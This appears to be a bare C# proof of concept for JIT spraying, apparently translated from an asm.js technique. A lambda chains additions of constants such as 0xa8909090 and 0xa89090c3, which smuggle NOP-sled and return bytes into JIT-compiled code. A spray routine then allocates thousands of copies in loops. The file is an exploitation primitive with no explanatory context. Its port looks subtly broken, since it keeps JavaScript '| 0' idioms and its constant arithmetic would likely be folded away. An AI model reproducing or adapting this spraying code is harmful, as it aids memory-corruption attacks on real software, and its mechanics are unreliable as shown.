using System.Diagnostics;
using System.Drawing;

internal class Program
{
    private static Func<long> asm_js_module()
    {
        Func<long> payload_code = new Func<long>(() =>
        {
            long val = 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa8909090) | 0;
            val = (val + 0xa89090c3) | 0;
            return val | 0;
        });
        return payload_code;
    }

    private static void spray()
    {
        List<Func<long>> sprayed = new List<Func<long>>();
        for (int i = 0; i <= 0x1800; i++)
        {
            sprayed.Add(asm_js_module());
        }
    }

  

    private static void Main(string[] args)
    {
        spray();

        Stopwatch sw = Stopwatch.StartNew();
        for (int index = 0; index < 0x10000; index++)
            spray();
        for (int index = 0; index < 0x10000; index++)
            spray();
        for (int index = 0; index < 0x10000; index++)
            spray();
        for (int index = 0; index < 0x10000; index++)
            spray();
        sw.Stop();
    }
}